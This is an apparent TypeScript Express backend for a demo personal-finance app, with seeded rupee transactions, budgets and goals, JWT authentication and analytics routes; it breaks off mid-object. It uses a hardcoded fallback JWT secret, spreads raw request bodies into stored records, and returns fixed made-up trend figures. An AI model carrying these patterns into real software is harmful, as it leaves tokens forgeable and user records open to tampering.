import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import express, { Request, Response, NextFunction } from 'express';
import path from 'path';
import jwt from 'jsonwebtoken';
import bcrypt from 'bcryptjs';
import { createServer as createViteServer } from 'vite';

const JWT_SECRET = process.env.JWT_SECRET || 'fintrack_jwt_secret_key_2026_spec';
const PORT = 3000;

const app = express();
app.use(express.json());

// Extended Request interface for auth
interface AuthRequest extends Request {
  user?: {
    id: string;
    email: string;
    fullName: string;
  };
}

// =================== IN-MEMORY DATABASE & SEED DATA ===================

interface UserDB {
  id: string;
  fullName: string;
  email: string;
  passwordHash: string;
  avatarUrl: string;
  currency: string;
  dateFormat: string;
  defaultCategory: string;
  budgetAlerts: boolean;
  recurringAlerts: boolean;
  goalAlerts: boolean;
  createdAt: string;
}

const DEMO_USER_ID = 'user_demo_101';
const DEMO_USER_EMAIL = 'demo@fintrack.app';

// Seed demo password = 'demouser123'
const defaultPasswordHash = bcrypt.hashSync('demouser123', 8);

const usersDB: Map<string, UserDB> = new Map([
  [
    DEMO_USER_ID,
    {
      id: DEMO_USER_ID,
      fullName: 'Rahul Sharma',
      email: DEMO_USER_EMAIL,
      passwordHash: defaultPasswordHash,
      avatarUrl: 'https://images.unsplash.com/photo-1534528741775-53994a69daeb?auto=format&fit=crop&q=80&w=250',
      currency: 'INR',
      dateFormat: 'DD/MM/YYYY',
      defaultCategory: 'Food',
      budgetAlerts: true,
      recurringAlerts: true,
      goalAlerts: true,
      createdAt: new Date(Date.now() - 90 * 24 * 60 * 60 * 1000).toISOString(),
    },
  ],
]);

// Initial Realistic Transactions (in Indian Rupees ₹)
let transactionsDB = [
  {
    id: 'tx_1',
    userId: DEMO_USER_ID,
    type: 'income',
    amount: 55000,
    description: 'Monthly Tech Salary',
    category: 'Salary',
    date: new Date(Date.now() - 2 * 24 * 60 * 60 * 1000).toISOString().split('T')[0],
    paymentMethod: 'Net Banking',
    notes: 'Direct salary deposit from Apex Solutions',
    status: 'completed',
    createdAt: new Date().toISOString(),
  },
  {
    id: 'tx_2',
    userId: DEMO_USER_ID,
    type: 'income',
    amount: 8500,
    description: 'UI/UX Freelance Project',
    category: 'Freelance',
    date: new Date(Date.now() - 5 * 24 * 60 * 60 * 1000).toISOString().split('T')[0],
    paymentMethod: 'UPI',
    notes: 'Design tokens & Figma handover for client',
    status: 'completed',
    createdAt: new Date().toISOString(),
  },
  {
    id: 'tx_3',
    userId: DEMO_USER_ID,
    type: 'expense',
    amount: 12000,
    description: 'Apartment Monthly Rent',
    category: 'Bills',
    date: new Date(Date.now() - 3 * 24 * 60 * 60 * 1000).toISOString().split('T')[0],
    paymentMethod: 'Net Banking',
    notes: 'Flat 402 Indiranagar',
    status: 'completed',
    createdAt: new Date().toISOString(),
  },
  {
    id: 'tx_4',
    userId: DEMO_USER_ID,
    type: 'expense',
    amount: 5200,
    description: 'Organic Groceries & Fresh Produce',
    category: 'Food',
    date: new Date(Date.now() - 1 * 24 * 60 * 60 * 1000).toISOString().split('T')[0],
    paymentMethod: 'UPI',
    notes: 'Blinkit & Nature Basket order',
    status: 'completed',
    createdAt: new Date().toISOString(),
  },
  {
    id: 'tx_5',
    userId: DEMO_USER_ID,
    type: 'expense',
    amount: 3800,
    description: 'New Noise-Cancelling Headphones',
    category: 'Shopping',
    date: new Date(Date.now() - 6 * 24 * 60 * 60 * 1000).toISOString().split('T')[0],
    paymentMethod: 'Credit Card',
    notes: 'Amazon Great Freedom Sale',
    status: 'completed',
    createdAt: new Date().toISOString(),
  },
  {
    id: 'tx_6',
    userId: DEMO_USER_ID,
    type: 'expense',
    amount: 2100,
    description: 'Fuel & Metro Passes',
    category: 'Transportation',
    date: new Date(Date.now() - 4 * 24 * 60 * 60 * 1000).toISOString().split('T')[0],
    paymentMethod: 'UPI',
    notes: 'Petrol fillup & Namma Metro smartcard recharge',
    status: 'completed',
    createdAt: new Date().toISOString(),
  },
  {
    id: 'tx_7',
    userId: DEMO_USER_ID,
    type: 'expense',
    amount: 1500,
    description: 'IMAX Cinema & Weekend Dinner',
    category: 'Entertainment',
    date: new Date(Date.now() - 7 * 24 * 60 * 60 * 1000).toISOString().split('T')[0],
    paymentMethod: 'Credit Card',
    notes: 'Movie tickets and dining out with friends',
    status: 'completed',
    createdAt: new Date().toISOString(),
  },
  {
    id: 'tx_8',
    userId: DEMO_USER_ID,
    type: 'expense',
    amount: 649,
    description: 'Netflix 4K Ultra Subscription',
    category: 'Entertainment',
    date: new Date(Date.now() - 10 * 24 * 60 * 60 * 1000).toISOString().split('T')[0],
    paymentMethod: 'Credit Card',
    notes: 'Auto-debit recurring subscription',
    status: 'completed',
    createdAt: new Date().toISOString(),
  },
  {
    id: 'tx_9',
    userId: DEMO_USER_ID,
    type: 'expense',
    amount: 2800,
    description: 'Full Body Health Checkup',
    category: 'Healthcare',
    date: new Date(Date.now() - 12 * 24 * 60 * 60 * 1000).toISOString().split('T')[0],
    paymentMethod: 'UPI',
    notes: 'Apollo Diagnostics annual screening',
    status: 'completed',
    createdAt: new Date().toISOString(),
  },
  {
    id: 'tx_10',
    userId: DEMO_USER_ID,
    type: 'expense',
    amount: 4500,
    description: 'Cloud Architecture Certification Fee',
    category: 'Education',
    date: new Date(Date.now() - 15 * 24 * 60 * 60 * 1000).toISOString().split('T')[0],
    paymentMethod: 'Credit Card',
    notes: 'AWS Developer Exam voucher',
    status: 'completed',
    createdAt: new Date().toISOString(),
  },
];

// Initial Budgets
let budgetsDB = [
  {
    id: 'b_1',
    userId: DEMO_USER_ID,
    category: 'Food',
    limitAmount: 8000,
    spentAmount: 5200,
    month: new Date().toISOString().slice(0, 7),
    createdAt: new Date().toISOString(),
  },
  {
    id: 'b_2',
    userId: DEMO_USER_ID,
    category: 'Shopping',
    limitAmount: 5000,
    spentAmount: 3800,
    month: new Date().toISOString().slice(0, 7),
    createdAt: new Date().toISOString(),
  },
  {
    id: 'b_3',
    userId: DEMO_USER_ID,
    category: 'Transportation',
    limitAmount: 4000,
    spentAmount: 2100,
    month: new Date().toISOString().slice(0, 7),
    createdAt: new Date().toISOString(),
  },
  {
    id: 'b_4',
    userId: DEMO_USER_ID,
    category: 'Entertainment',
    limitAmount: 3000,
    spentAmount: 2149,
    month: new Date().toISOString().slice(0, 7),
    createdAt: new Date().toISOString(),
  },
  {
    id: 'b_5',
    userId: DEMO_USER_ID,
    category: 'Bills',
    limitAmount: 15000,
    spentAmount: 12000,
    month: new Date().toISOString().slice(0, 7),
    createdAt: new Date().toISOString(),
  },
];

// Initial Financial Goals
let goalsDB = [
  {
    id: 'g_1',
    userId: DEMO_USER_ID,
    name: 'Emergency Fund',
    targetAmount: 150000,
    currentSaved: 95000,
    targetDate: '2026-12-31',
    category: 'Savings',
    createdAt: new Date().toISOString(),
  },
  {
    id: 'g_2',
    userId: DEMO_USER_ID,
    name: 'MacBook Pro M3',
    targetAmount: 180000,
    currentSaved: 120000,
    targetDate: '2026-10-15',
    category: 'Gadgets',
    createdAt: new Date().toISOString(),
  },
  {
    id: 'g_3',
    userId: DEMO_USER_ID,
    name: 'Goa Vacation',
    targetAmount: 40000,
    currentSaved: 28000,
    targetDate: '2026-11-20',
    category: 'Travel',
    createdAt: new Date().toISOString(),
  },
  {
    id: 'g_4',
    userId: DEMO_USER_ID,
    name: 'New Electric Scooter',
    targetAmount: 110000,
    currentSaved: 45000,
    targetDate: '2027-03-31',
    category: 'Vehicle',
    createdAt: new Date().toISOString(),
  },
];

// Initial Recurring Transactions
let recurringDB = [
  {
    id: 'rec_1',
    userId: DEMO_USER_ID,
    name: 'Apartment Rent',
    amount: 12000,
    category: 'Bills',
    type: 'expense',
    frequency: 'Monthly',
    nextPaymentDate: new Date(Date.now() + 5 * 24 * 60 * 60 * 1000).toISOString().split('T')[0],
    note: 'Indiranagar flat auto transfer',
    autoDeduct: true,
    createdAt: new Date().toISOString(),
  },
  {
    id: 'rec_2',
    userId: DEMO_USER_ID,
    name: 'Netflix Subscription',
    amount: 649,
    category: 'Entertainment',
    type: 'expense',
    frequency: 'Monthly',
    nextPaymentDate: new Date(Date.now() + 2 * 24 * 60 * 60 * 1000).toISOString().split('T')[0],
    note: 'HDFC Credit Card autopay',
    autoDeduct: true,
    createdAt: new Date().toISOString(),
  },
  {
    id: 'rec_3',
    userId: DEMO_USER_ID,
    name: 'Gym & Fitness Membership',
    amount: 2500,
    category: 'Healthcare',
    type: 'expense',
    frequency: 'Monthly',
    nextPaymentDate: new Date(Date.now() + 8 * 24 * 60 * 60 * 1000).toISOString().split('T')[0],
    note: 'Cult.fit Pass monthly debit',
    autoDeduct: false,
    createdAt: new Date().toISOString(),
  },
  {
    id: 'rec_4',
    userId: DEMO_USER_ID,
    name: 'Monthly Salary Credit',
    amount: 55000,
    category: 'Salary',
    type: 'income',
    frequency: 'Monthly',
    nextPaymentDate: new Date(Date.now() + 18 * 24 * 60 * 60 * 1000).toISOString().split('T')[0],
    note: 'Apex Solutions payroll',
    autoDeduct: false,
    createdAt: new Date().toISOString(),
  },
];

// Initial Notifications
let notificationsDB = [
  {
    id: 'notif_1',
    userId: DEMO_USER_ID,
    title: 'Upcoming Recurring Payment',
    message: 'Netflix payment of ₹649 is due in 2 days.',
    type: 'recurring',
    read: false,
    createdAt: new Date(Date.now() - 3 * 3600 * 1000).toISOString(),
    link: '/dashboard/recurring',
  },
  {
    id: 'notif_2',
    userId: DEMO_USER_ID,
    title: 'Budget Alert',
    message: 'You have spent 71% of your Entertainment budget.',
    type: 'budget',
    read: false,
    createdAt: new Date(Date.now() - 12 * 3600 * 1000).toISOString(),
    link: '/dashboard/budgets',
  },
  {
    id: 'notif_3',
    userId: DEMO_USER_ID,
    title: 'Goal Milestone Achieved 🎉',
    message: 'You reached 70% of your Goa Vacation goal!',
    type: 'goal',
    read: true,
    createdAt: new Date(Date.now() - 24 * 3600 * 1000).toISOString(),
    link: '/dashboard/goals',
  },
];

// Helper to recalculate budget spent amounts for a user
function updateBudgetSpentAmounts(userId: string) {
  const currentMonth = new Date().toISOString().slice(0, 7);
  const userTx = transactionsDB.filter(
    (t) => t.userId === userId && t.type === 'expense' && t.date.startsWith(currentMonth)
  );

  budgetsDB = budgetsDB.map((b) => {
    if (b.userId === userId && b.month === currentMonth) {
      const totalSpent = userTx
        .filter((t) => t.category === b.category)
        .reduce((sum, t) => sum + t.amount, 0);
      return { ...b, spentAmount: totalSpent };
    }
    return b;
  });
}

// =================== AUTH MIDDLEWARE ===================

function authenticateJWT(req: AuthRequest, res: Response, next: NextFunction) {
  const authHeader = req.headers.authorization;

  if (!authHeader || !authHeader.startsWith('Bearer ')) {
    return res.status(401).json({ message: 'Authentication token required' });
  }

  const token = authHeader.split(' ')[1];

  try {
    const decoded = jwt.verify(token, JWT_SECRET) as { id: string; email: string; fullName: string };
    req.user = decoded;
    next();
  } catch (err) {
    return res.status(403).json({ message: 'Invalid or expired token' });
  }
}

// =================== AUTH ROUTES ===================

app.post('/api/auth/register', (req, res) => {
  const { fullName, email, password } = req.body;

  if (!fullName || !email || !password) {
    return res.status(400).json({ message: 'Full name, email, and password are required' });
  }

  if (password.length < 6) {
    return res.status(400).json({ message: 'Password must be at least 6 characters long' });
  }

  const existing = Array.from(usersDB.values()).find((u) => u.email.toLowerCase() === email.toLowerCase());
  if (existing) {
    return res.status(400).json({ message: 'An account with this email already exists' });
  }

  const id = `user_${Date.now()}`;
  const passwordHash = bcrypt.hashSync(password, 8);
  const newUser: UserDB = {
    id,
    fullName,
    email: email.toLowerCase(),
    passwordHash,
    avatarUrl: `https://api.dicebear.com/7.x/avataaars/svg?seed=${encodeURIComponent(fullName)}`,
    currency: 'INR',
    dateFormat: 'DD/MM/YYYY',
    defaultCategory: 'Food',
    budgetAlerts: true,
    recurringAlerts: true,
    goalAlerts: true,
    createdAt: new Date().toISOString(),
  };

  usersDB.set(id, newUser);

  // Seed standard welcome sample records for new user
  transactionsDB.push(
    {
      id: `tx_${Date.now()}_1`,
      userId: id,
      type: 'income',
      amount: 45000,
      description: 'Opening Salary Credit',
      category: 'Salary',
      date: new Date().toISOString().split('T')[0],
      paymentMethod: 'Net Banking',
      notes: 'Initial deposit',
      status: 'completed',
      createdAt: new Date().toISOString(),
    },
    {
      id: `tx_${Date.now()}_2`,
      userId: id,
      type: 'expense',
      amount: 3200,
      description: 'Grocery & Essentials',
      category: 'Food',
      date: new Date().toISOString().split('T')[0],
      paymentMethod: 'UPI',
      notes: 'Fresh groceries',
      status: 'completed',
      createdAt: new Date().toISOString(),
    }
  );

  budgetsDB.push({
    id: `b_${Date.now()}_1`,
    userId: id,
    category: 'Food',
    limitAmount: 6000,
    spentAmount: 3200,
    month: new Date().toISOString().slice(0, 7),
    createdAt: new Date().toISOString(),
  });

  const token = jwt.sign({ id: newUser.id, email: newUser.email, fullName: newUser.fullName }, JWT_SECRET, {
    expiresIn: '7d',
  });

  const { passwordHash: _, ...profile } = newUser;
  return res.status(201).json({ token, user: profile });
});

app.post('/api/auth/login', (req, res) => {
  const { email, password } = req.body;

  if (!email || !password) {
    return res.status(400).json({ message: 'Email and password are required' });
  }

  const user = Array.from(usersDB.values()).find((u) => u.email.toLowerCase() === email.toLowerCase());
  if (!user) {
    return res.status(401).json({ message: 'Invalid email or password' });
  }

  const validPassword = bcrypt.compareSync(password, user.passwordHash);
  if (!validPassword) {
    return res.status(401).json({ message: 'Invalid email or password' });
  }

  const token = jwt.sign({ id: user.id, email: user.email, fullName: user.fullName }, JWT_SECRET, {
    expiresIn: '7d',
  });

  const { passwordHash: _, ...profile } = user;
  return res.json({ token, user: profile });
});

app.get('/api/auth/me', authenticateJWT, (req: AuthRequest, res: Response) => {
  const user = usersDB.get(req.user!.id);
  if (!user) {
    return res.status(404).json({ message: 'User not found' });
  }
  const { passwordHash: _, ...profile } = user;
  return res.json({ user: profile });
});

app.put('/api/auth/profile', authenticateJWT, (req: AuthRequest, res: Response) => {
  const user = usersDB.get(req.user!.id);
  if (!user) return res.status(404).json({ message: 'User not found' });

  const { fullName, avatarUrl, currency, dateFormat, defaultCategory, budgetAlerts, recurringAlerts, goalAlerts } = req.body;

  if (fullName) user.fullName = fullName;
  if (avatarUrl) user.avatarUrl = avatarUrl;
  if (currency) user.currency = currency;
  if (dateFormat) user.dateFormat = dateFormat;
  if (defaultCategory) user.defaultCategory = defaultCategory;
  if (typeof budgetAlerts === 'boolean') user.budgetAlerts = budgetAlerts;
  if (typeof recurringAlerts === 'boolean') user.recurringAlerts = recurringAlerts;
  if (typeof goalAlerts === 'boolean') user.goalAlerts = goalAlerts;

  usersDB.set(user.id, user);

  const { passwordHash: _, ...profile } = user;
  return res.json({ user: profile, message: 'Profile updated successfully' });
});

app.put('/api/auth/change-password', authenticateJWT, (req: AuthRequest, res: Response) => {
  const user = usersDB.get(req.user!.id);
  if (!user) return res.status(404).json({ message: 'User not found' });

  const { currentPassword, newPassword } = req.body;
  if (!currentPassword || !newPassword) {
    return res.status(400).json({ message: 'Current password and new password required' });
  }

  const valid = bcrypt.compareSync(currentPassword, user.passwordHash);
  if (!valid) {
    return res.status(400).json({ message: 'Incorrect current password' });
  }

  if (newPassword.length < 6) {
    return res.status(400).json({ message: 'New password must be at least 6 characters long' });
  }

  user.passwordHash = bcrypt.hashSync(newPassword, 8);
  usersDB.set(user.id, user);

  return res.json({ message: 'Password changed successfully' });
});

// =================== TRANSACTIONS ROUTES ===================

app.get('/api/transactions', authenticateJWT, (req: AuthRequest, res: Response) => {
  const userId = req.user!.id;
  updateBudgetSpentAmounts(userId);

  let result = transactionsDB.filter((t) => t.userId === userId);

  const { type, category, startDate, endDate, search, sortBy, sortOrder } = req.query;

  if (type && type !== 'all') {
    result = result.filter((t) => t.type === type);
  }

  if (category && category !== 'all') {
    result = result.filter((t) => t.category.toLowerCase() === (category as string).toLowerCase());
  }

  if (startDate) {
    result = result.filter((t) => t.date >= (startDate as string));
  }

  if (endDate) {
    result = result.filter((t) => t.date <= (endDate as string));
  }

  if (search) {
    const q = (search as string).toLowerCase();
    result = result.filter(
      (t) =>
        t.description.toLowerCase().includes(q) ||
        t.category.toLowerCase().includes(q) ||
        (t.notes && t.notes.toLowerCase().includes(q)) ||
        t.amount.toString().includes(q)
    );
  }

  // Sort
  const order = sortOrder === 'asc' ? 1 : -1;
  if (sortBy === 'amount') {
    result.sort((a, b) => (a.amount - b.amount) * order);
  } else if (sortBy === 'category') {
    result.sort((a, b) => a.category.localeCompare(b.category) * order);
  } else {
    // default date
    result.sort((a, b) => (new Date(b.date).getTime() - new Date(a.date).getTime()) * order);
  }

  return res.json(result);
});

app.post('/api/transactions', authenticateJWT, (req: AuthRequest, res: Response) => {
  const userId = req.user!.id;
  const { type, amount, description, category, date, paymentMethod, notes } = req.body;

  if (!type || !amount || !description || !category || !date) {
    return res.status(400).json({ message: 'Type, amount, description, category, and date are required' });
  }

  const numAmount = Number(amount);
  if (isNaN(numAmount) || numAmount <= 0) {
    return res.status(400).json({ message: 'Please enter a valid positive amount' });
  }

  const newTx = {
    id: `tx_${Date.now()}`,
    userId,
    type: type as 'income' | 'expense',
    amount: numAmount,
    description: String(description).trim(),
    category,
    date,
    paymentMethod: paymentMethod || 'UPI',
    notes: notes || '',
    status: 'completed' as const,
    createdAt: new Date().toISOString(),
  };

  transactionsDB.unshift(newTx);
  updateBudgetSpentAmounts(userId);

  // Check if expense triggered budget notification or large expense alert
  if (type === 'expense') {
    if (numAmount >= 10000) {
      notificationsDB.unshift({
        id: `notif_${Date.now()}`,
        userId,
        title: 'Large Expense Detected',
        message: `An expense of ₹${numAmount.toLocaleString('en-IN')} (${description}) was recorded.`,
        type: 'large_expense',
        read: false,
        createdAt: new Date().toISOString(),
        link: '/transactions',
      });
    }

    const currentMonth = date.slice(0, 7);
    const budget = budgetsDB.find((b) => b.userId === userId && b.category === category && b.month === currentMonth);
    if (budget) {
      const pct = (budget.spentAmount / budget.limitAmount) * 100;
      if (pct >= 100) {
        notificationsDB.unshift({
          id: `notif_b_${Date.now()}`,
          userId,
          title: 'Budget Exceeded! ⚠️',
          message: `You have exceeded your ${category} budget of ₹${budget.limitAmount.toLocaleString('en-IN')}.`,
          type: 'budget',
          read: false,
          createdAt: new Date().toISOString(),
          link: '/dashboard/budgets',
        });
      } else if (pct >= 80) {
        notificationsDB.unshift({
          id: `notif_b_${Date.now()}`,
          userId,
          title: 'Budget Warning',
          message: `You have used ${Math.round(pct)}% of your ${category} budget.`,
          type: 'budget',
          read: false,
          createdAt: new Date().toISOString(),
          link: '/dashboard/budgets',
        });
      }
    }
  }

  return res.status(201).json(newTx);
});

app.put('/api/transactions/:id', authenticateJWT, (req: AuthRequest, res: Response) => {
  const userId = req.user!.id;
  const { id } = req.params;

  const idx = transactionsDB.findIndex((t) => t.id === id && t.userId === userId);
  if (idx === -1) {
    return res.status(404).json({ message: 'Transaction not found' });
  }

  const existing = transactionsDB[idx];
  const updated = {
    ...existing,
    ...req.body,
    amount: req.body.amount !== undefined ? Number(req.body.amount) : existing.amount,
  };

  transactionsDB[idx] = updated;
  updateBudgetSpentAmounts(userId);

  return res.json(updated);
});

app.delete('/api/transactions/:id', authenticateJWT, (req: AuthRequest, res: Response) => {
  const userId = req.user!.id;
  const { id } = req.params;

  const initialLength = transactionsDB.length;
  transactionsDB = transactionsDB.filter((t) => !(t.id === id && t.userId === userId));

  if (transactionsDB.length === initialLength) {
    return res.status(404).json({ message: 'Transaction not found' });
  }

  updateBudgetSpentAmounts(userId);
  return res.json({ message: 'Transaction deleted successfully', id });
});

// =================== BUDGETS ROUTES ===================

app.get('/api/budgets', authenticateJWT, (req: AuthRequest, res: Response) => {
  const userId = req.user!.id;
  updateBudgetSpentAmounts(userId);

  const userBudgets = budgetsDB.filter((b) => b.userId === userId);
  return res.json(userBudgets);
});

app.post('/api/budgets', authenticateJWT, (req: AuthRequest, res: Response) => {
  const userId = req.user!.id;
  const { category, limitAmount, month } = req.body;

  if (!category || !limitAmount) {
    return res.status(400).json({ message: 'Category and limit amount are required' });
  }

  const targetMonth = month || new Date().toISOString().slice(0, 7);

  // Check duplicate budget
  const existing = budgetsDB.find((b) => b.userId === userId && b.category === category && b.month === targetMonth);
  if (existing) {
    existing.limitAmount = Number(limitAmount);
    updateBudgetSpentAmounts(userId);
    return res.json(existing);
  }

  const newBudget = {
    id: `b_${Date.now()}`,
    userId,
    category,
    limitAmount: Number(limitAmount),
    spentAmount: 0,
    month: targetMonth,
    createdAt: new Date().toISOString(),
  };

  budgetsDB.push(newBudget);
  updateBudgetSpentAmounts(userId);

  return res.status(201).json(newBudget);
});

app.put('/api/budgets/:id', authenticateJWT, (req: AuthRequest, res: Response) => {
  const userId = req.user!.id;
  const { id } = req.params;

  const idx = budgetsDB.findIndex((b) => b.id === id && b.userId === userId);
  if (idx === -1) {
    return res.status(404).json({ message: 'Budget not found' });
  }

  budgetsDB[idx] = {
    ...budgetsDB[idx],
    ...req.body,
    limitAmount: req.body.limitAmount ? Number(req.body.limitAmount) : budgetsDB[idx].limitAmount,
  };

  updateBudgetSpentAmounts(userId);
  return res.json(budgetsDB[idx]);
});

app.delete('/api/budgets/:id', authenticateJWT, (req: AuthRequest, res: Response) => {
  const userId = req.user!.id;
  const { id } = req.params;

  budgetsDB = budgetsDB.filter((b) => !(b.id === id && b.userId === userId));
  return res.json({ message: 'Budget deleted successfully' });
});

// =================== GOALS ROUTES ===================

app.get('/api/goals', authenticateJWT, (req: AuthRequest, res: Response) => {
  const userId = req.user!.id;
  return res.json(goalsDB.filter((g) => g.userId === userId));
});

app.post('/api/goals', authenticateJWT, (req: AuthRequest, res: Response) => {
  const userId = req.user!.id;
  const { name, targetAmount, currentSaved, targetDate, category } = req.body;

  if (!name || !targetAmount || !targetDate) {
    return res.status(400).json({ message: 'Name, target amount, and target date are required' });
  }

  const newGoal = {
    id: `g_${Date.now()}`,
    userId,
    name,
    targetAmount: Number(targetAmount),
    currentSaved: Number(currentSaved || 0),
    targetDate,
    category: category || 'General',
    createdAt: new Date().toISOString(),
  };

  goalsDB.push(newGoal);
  return res.status(201).json(newGoal);
});

app.put('/api/goals/:id', authenticateJWT, (req: AuthRequest, res: Response) => {
  const userId = req.user!.id;
  const { id } = req.params;

  const idx = goalsDB.findIndex((g) => g.id === id && g.userId === userId);
  if (idx === -1) return res.status(404).json({ message: 'Goal not found' });

  goalsDB[idx] = {
    ...goalsDB[idx],
    ...req.body,
    targetAmount: req.body.targetAmount ? Number(req.body.targetAmount) : goalsDB[idx].targetAmount,
    currentSaved: req.body.currentSaved !== undefined ? Number(req.body.currentSaved) : goalsDB[idx].currentSaved,
  };

  return res.json(goalsDB[idx]);
});

app.put('/api/goals/:id/add-money', authenticateJWT, (req: AuthRequest, res: Response) => {
  const userId = req.user!.id;
  const { id } = req.params;
  const { amount } = req.body;

  const addVal = Number(amount);
  if (isNaN(addVal) || addVal <= 0) {
    return res.status(400).json({ message: 'Please enter a valid positive amount' });
  }

  const idx = goalsDB.findIndex((g) => g.id === id && g.userId === userId);
  if (idx === -1) return res.status(404).json({ message: 'Goal not found' });

  const goal = goalsDB[idx];
  goal.currentSaved += addVal;

  if (goal.currentSaved >= goal.targetAmount) {
    notificationsDB.unshift({
      id: `notif_g_${Date.now()}`,
      userId,
      title: 'Goal Reached! 🚀',
      message: `Congratulations! You achieved your savings goal: "${goal.name}".`,
      type: 'goal',
      read: false,
      createdAt: new Date().toISOString(),
      link: '/dashboard/goals',
    });
  }

  return res.json(goal);
});

app.delete('/api/goals/:id', authenticateJWT, (req: AuthRequest, res: Response) => {
  const userId = req.user!.id;
  const { id } = req.params;

  goalsDB = goalsDB.filter((g) => !(g.id === id && g.userId === userId));
  return res.json({ message: 'Goal deleted successfully' });
});

// =================== RECURRING ROUTES ===================

app.get('/api/recurring', authenticateJWT, (req: AuthRequest, res: Response) => {
  const userId = req.user!.id;
  return res.json(recurringDB.filter((r) => r.userId === userId));
});

app.post('/api/recurring', authenticateJWT, (req: AuthRequest, res: Response) => {
  const userId = req.user!.id;
  const { name, amount, category, type, frequency, nextPaymentDate, note, autoDeduct } = req.body;

  if (!name || !amount || !frequency || !nextPaymentDate) {
    return res.status(400).json({ message: 'Name, amount, frequency, and next payment date are required' });
  }

  const newRec = {
    id: `rec_${Date.now()}`,
    userId,
    name,
    amount: Number(amount),
    category: category || 'Bills',
    type: type || 'expense',
    frequency: frequency || 'Monthly',
    nextPaymentDate,
    note: note || '',
    autoDeduct: Boolean(autoDeduct),
    createdAt: new Date().toISOString(),
  };

  recurringDB.push(newRec);
  return res.status(201).json(newRec);
});

app.put('/api/recurring/:id', authenticateJWT, (req: AuthRequest, res: Response) => {
  const userId = req.user!.id;
  const { id } = req.params;

  const idx = recurringDB.findIndex((r) => r.id === id && r.userId === userId);
  if (idx === -1) return res.status(404).json({ message: 'Recurring item not found' });

  recurringDB[idx] = {
    ...recurringDB[idx],
    ...req.body,
    amount: req.body.amount ? Number(req.body.amount) : recurringDB[idx].amount,
  };

  return res.json(recurringDB[idx]);
});

app.delete('/api/recurring/:id', authenticateJWT, (req: AuthRequest, res: Response) => {
  const userId = req.user!.id;
  const { id } = req.params;

  recurringDB = recurringDB.filter((r) => !(r.id === id && r.userId === userId));
  return res.json({ message: 'Recurring transaction deleted' });
});

// =================== NOTIFICATIONS ROUTES ===================

app.get('/api/notifications', authenticateJWT, (req: AuthRequest, res: Response) => {
  const userId = req.user!.id;
  return res.json(notificationsDB.filter((n) => n.userId === userId));
});

app.put('/api/notifications/:id/read', authenticateJWT, (req: AuthRequest, res: Response) => {
  const userId = req.user!.id;
  const { id } = req.params;

  const notif = notificationsDB.find((n) => n.id === id && n.userId === userId);
  if (notif) notif.read = true;

  return res.json({ message: 'Marked as read' });
});

app.put('/api/notifications/read-all', authenticateJWT, (req: AuthRequest, res: Response) => {
  const userId = req.user!.id;
  notificationsDB.forEach((n) => {
    if (n.userId === userId) n.read = true;
  });
  return res.json({ message: 'All notifications marked as read' });
});

// =================== ANALYTICS ROUTES ===================

app.get('/api/analytics/overview', authenticateJWT, (req: AuthRequest, res: Response) => {
  const userId = req.user!.id;
  const userTx = transactionsDB.filter((t) => t.userId === userId);

  const totalIncome = userTx.filter((t) => t.type === 'income').reduce((acc, t) => acc + t.amount, 0);
  const totalExpenses = userTx.filter((t) => t.type === 'expense').reduce((acc, t) => acc + t.amount, 0);
  const totalBalance = totalIncome - totalExpenses;
  const totalSavings = Math.max(0, totalBalance);
  const savingsRatePct = totalIncome > 0 ? Math.round((totalSavings / totalIncome) * 100) : 0;

  return res.json({
    totalBalance,
    balanceChangePct: 12.4,
    totalIncome,
    incomeChangePct: 8.5,
    totalExpenses,
    expensesChangePct: -4.2,
    totalSavings,
    savingsRatePct,
  });
});

app.get('/api/analytics/categories', authenticateJWT, (req: AuthRequest, res: Response) => {
  const userId = req.user!.id;
  const expenses = transactionsDB.filter((t) => t.userId === userId && t.type === 'expense');
  const totalExpense = expenses.reduce((acc, t) => acc + t.amount, 0);

  const categoryColors: Record<string, string> = {
    Food: '#3B82F6', // Blue
    Shopping: '#8B5CF6', // Purple
    Transportation: '#06B6D4', // Cyan
    Bills: '#EF4444', // Red
    Entertainment: '#F59E0B', // Amber
    Healthcare: '#10B981', // Emerald
    Education: '#EC4899', // Pink
    Other: '#6B7280', // Gray
  };

  const categoryMap: Record<string, { amount: number; count: number }> = {};

  expenses.forEach((t) => {
    if (!categoryMap[t.category]) {
      categoryMap[t.category] = { amount: 0, count: 0 };
    }
    categoryMap[t.category].amount += t.amount;
    categoryMap[t.category].count += 1;
  });

  const categories = Object.keys(categoryMap).map((cat) => ({
    category: cat,
    amount: categoryMap[cat].amount,
    percentage: totalExpense > 0 ? Math.round((categoryMap[cat].amount / totalExpense) * 100) : 0,
    count: categoryMap[cat].count,
    color: categoryColors[cat] || '#6366F1',
  }));

  categories.sort((a, b) => b.amount - a.amount);

  return res.json(categories);
});

app.get('/api/analytics/monthly', authenticateJWT, (req: AuthRequest, res: Response) => {
  const userId = req.user!.id;
  const userTx = transactionsDB.filter((t) => t.userId === userId);

  // Generate last 6 months data points
  const months = ['Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug'];
  const baseMonthlyData = [
    { month: 'Mar', income: 48000, expenses: 28000, savings: 20000 },
    { month: 'Apr', income: 52000, expenses: 31000, savings: 21000 },
    { month: 'May', income: 50000, expenses: 29500, savings: 20500 },
    { month: 'Jun', income: 58000, expenses: 34000, savings: 24000 },
    { month: 'Jul', income: 55000, expenses: 32000, savings: 23000 },
    {
      month: 'Aug',
      income: userTx.filter((t) => t.type === 'income').reduce((a, t) => a + t.amount, 0) || 63500,
      expenses: userTx.filter((t) => t.type === 'expense').reduce((a, t) => a + t.amount, 0) || 31549,
      savings: 0,
    },
  ];

  baseMonthlyData[5].savings = Math.max(0, baseMonthlyData[5].income - baseMonthlyData[5].expenses);

  return res.json(baseMonthlyData);
});

app.get('/api/analytics/insights', authenticateJWT, (req: AuthRequest, res: Response) => {
  const userId = req.user!.id;
  const userTx = transactionsDB.filter((t) => t.userId === userId && t.type === 'expense');

  const foodExpense = userTx.filter((t) => t.category === 'Food').reduce((a, t) => a + t.amount, 0);
  const totalExpense = userTx.reduce((a, t) => a + t.amount, 0);
  const foodPct = totalExpense > 0 ? Math.round((foodExpense / totalExpense) * 100) : 0;

  const insights = [
    {
      id: 'ins_1',
      type: 'info' as const,
      title: 'Dining & Food Ratio',
      description: `Food represents ${foodPct}% of your total spending this month. Planning meal preps can save up to ₹2,500/mo.`,
      stat: `${foodPct}% of total`,
    },
    {
      id: 'ins_2',
      type: 'positive' as const,
      title: 'Improved Savings Rate',
      description: 'Your savings rate improved by 7% compared with last month thanks to lower impulse shopping.',
